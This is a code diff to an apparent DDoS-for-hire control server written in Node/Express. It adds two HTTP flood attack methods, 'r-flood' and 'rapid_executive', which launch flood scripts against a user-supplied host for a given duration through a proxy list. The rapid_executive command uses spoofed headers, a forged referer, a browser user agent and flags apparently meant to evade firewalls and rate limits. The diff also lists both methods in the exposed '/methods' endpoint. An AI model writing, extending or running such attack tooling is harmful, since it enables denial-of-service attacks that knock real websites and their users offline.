@@ -201,6 +201,12 @@ app.get("/", async (req, res) => {
       case "h1":
         await runScreenCommand(`node loki.js ${host} ${time} 8 5 proxy.txt`, '/root/methods/')
         break
+      case "r-flood":
+        await runScreenCommand(`node r-flood.js ${host} ${time} 80 8 proxy.txt`, '/root/methods/')
+        break
+      case "rapid_executive":
+        await runScreenCommand(`node rapid_executive.js GET ${host} ${time} 24 50 proxy.txt --referer https://l-firewall.id --ratelimit true --debug true --bfm true --header \"Access-Control-Max-Age: 600\" --header \"Sec-Ch-Ua-Mobile: ?0\" --header \"Access-Control-Request-Headers: content-type,x-pingother\" --header \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\" --ua \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\" --full`, '/root/methods/')
+        break
       case "h2-killer":
         await runScreenCommand(`node H2KILLER.js ${host} ${time} 8 3 proxy.txt`, '/root/methods/')
         break
@@ -278,6 +284,8 @@ app.get("/methods", (req, res) => {
     "mixbill",
     "cf-pro",
     "h2-blast",
+    "rapid_executive",
+    "r-flood",
     "h2-meris",
     "h2-hold",
     "browser",
